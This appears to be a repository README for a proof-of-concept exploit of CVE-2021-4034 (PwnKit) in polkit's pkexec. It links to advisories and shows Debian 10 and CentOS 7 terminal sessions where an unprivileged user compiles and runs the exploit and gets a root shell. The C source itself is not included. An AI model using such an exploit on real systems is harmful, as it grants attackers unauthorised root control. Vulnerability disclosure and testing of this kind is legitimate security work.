
![polkit-bug](https://user-images.githubusercontent.com/72974932/151581571-4d8cea4d-3c73-4cb2-be4e-5370020c0f0c.png)

# **CVE-2021-4034**

While the vulnerability is not exploitable remotely and doesn’t, in itself, allow arbitrary code execution, it can be used by attackers that have already gained a foothold on a vulnerable host to escalate their privileges and achieve that capability.

[https://seclists.org/oss-sec/2022/q1/80](https://seclists.org/oss-sec/2022/q1/80)[https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)


# **PoC**

Verified on Debian 10 and CentOS 7.


You can find the repo at this link here → [https://github.com/Yakumwamba/POC-CVE-2021-4034.git](https://github.com/Yakumwamba/POC-CVE-2021-4034.git)

```jsx
user@debian:~$ grep PRETTY /etc/os-release
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
user@debian:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
user@debian:~$ gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
user@debian:~$ ./cve-2021-4034-poc
# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(user)
```

```jsx
[user@centos ~]$ grep PRETTY /etc/os-release
PRETTY_NAME="CentOS Linux 7 (Core)"
[user@centos ~]$ id
uid=11000(user) gid=11000(user) groups=11000(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[user@centos ~]$ gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
[user@centos ~]$ ./cve-2021-4034-poc
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root),11000(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
sh-4.2# exit
```

## Discalimer - this tool can be used maliciously 
It can also be used to damage or disable unpatched LInux servers. The author of this tool is not responsible for any damages or losses that may occur as a result of its use.


